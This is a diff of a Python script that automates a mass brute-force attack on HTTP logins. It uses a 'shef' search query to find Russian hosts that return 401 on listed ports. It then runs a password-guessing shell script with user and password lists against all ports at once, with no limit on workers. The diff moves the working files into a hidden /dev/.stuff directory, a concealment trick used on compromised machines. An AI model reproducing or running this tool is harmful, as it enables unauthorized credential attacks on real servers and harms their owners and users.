@@ -7,9 +7,8 @@ import time
 # Configuration
 ports_file = "ports.txt"
 files_to_copy = ["passwd.txt", "script.sh", "users.txt"]
-httpbrute_dir = "httpbrute"  # Directory containing files to copy
-ports_dir = "ports"  # Base directory for port directories
-max_workers = 5  # Maximum number of concurrent tasks
+httpbrute_dir = "/dev/.stuff/httpbrute"  # Directory containing files to copy
+ports_dir = "/dev/.stuff/ports"  # Base directory for port directories
 delay_after = 3  # Number of commands to run before pausing
 delay_seconds = 5  # Number of seconds to wait during pause
 
@@ -24,33 +23,37 @@ except FileNotFoundError:
     print(f"Error: {ports_file} not found.")
     exit(1)
 
-def process_shef(port, counter):
+def process_shef_with_delay(ports, delay_after, delay_seconds):
     """
-    Run the shef command for a given port and set up the directory.
+    Process the shef commands sequentially with a delay after every `delay_after` commands.
     """
-    port_dir = os.path.join(ports_dir, f"port_{port}")
-    os.makedirs(port_dir, exist_ok=True)
+    for counter, port in enumerate(ports, start=1):
+        port_dir = os.path.join(ports_dir, f"port_{port}")
+        os.makedirs(port_dir, exist_ok=True)
 
-    # Run the 'shef' command and save the output
-    output_file = os.path.join(port_dir, f"{port}_401.txt")
-    shef_command = f"shef -q \"country:ru '401' port:{port}\" > {output_file}"
-    print(f"Running shef for port {port}: {shef_command}")
-    subprocess.run(shef_command, shell=True, check=True)
+        # Run the 'shef' command and save the output
+        output_file = os.path.join(port_dir, f"{port}_401.txt")
+        shef_command = f"shef -q \"country:ru '401' port:{port}\" > {output_file}"
+        print(f"Running shef for port {port}: {shef_command}")
+        try:
+            subprocess.run(shef_command, shell=True, check=True)
+        except subprocess.CalledProcessError as e:
+            print(f"Error running shef for port {port}: {e}")
+            continue
 
-    # Copy necessary files into the directory
-    for file in files_to_copy:
-        source_path = os.path.join(httpbrute_dir, file)
-        destination_path = os.path.join(port_dir, file)
-        if os.path.exists(source_path):
-            shutil.copy(source_path, destination_path)
-        else:
-            print(f"Warning: {file} not found in {httpbrute_dir}.")
+        # Copy necessary files into the directory
+        for file in files_to_copy:
+            source_path = os.path.join(httpbrute_dir, file)
+            destination_path = os.path.join(port_dir, file)
+            if os.path.exists(source_path):
+                shutil.copy(source_path, destination_path)
+            else:
+                print(f"Warning: {file} not found in {httpbrute_dir}.")
 
-    # Introduce a delay after every `delay_after` commands
-    if counter % delay_after == 0:
-        print(f"Pausing for {delay_seconds} seconds to prevent server overload...")
-        time.sleep(delay_seconds)
-    return port
+        # Introduce a delay after every `delay_after` commands
+        if counter % delay_after == 0:
+            print(f"Pausing for {delay_seconds} seconds to prevent server overload...")
+            time.sleep(delay_seconds)
 
 def brute_force(port):
     """
@@ -64,21 +67,19 @@ def brute_force(port):
 
     brute_command = f"bash {script_path} {host_list_path} {user_list_path} {pass_list_path} {port}"
     print(f"Running brute force for port {port}: {brute_command}")
-    subprocess.run(brute_command, shell=True, check=True)
+    try:
+        subprocess.run(brute_command, shell=True, check=True)
+    except subprocess.CalledProcessError as e:
+        print(f"Error running brute force for port {port}: {e}")
 
 # Step 1: Run 'shef' for all ports with delay
 print("Starting shef processing for all ports...")
-with ThreadPoolExecutor(max_workers=max_workers) as executor:
-    # Add a counter to track the number of executed commands
-    futures = [executor.submit(process_shef, port, i + 1) for i, port in enumerate(ports)]
-    for future in futures:
-        future.result()  # Ensure each task completes
-
+process_shef_with_delay(ports, delay_after, delay_seconds)
 print("Shef processing completed for all ports.")
 
 # Step 2: Start brute-forcing for all ports concurrently
 print("Starting brute force attacks for all ports...")
-with ThreadPoolExecutor(max_workers=max_workers) as executor:
+with ThreadPoolExecutor() as executor:  # No max_workers = unlimited
     executor.map(brute_force, ports)
 
 print("Brute force operations completed for all ports.")
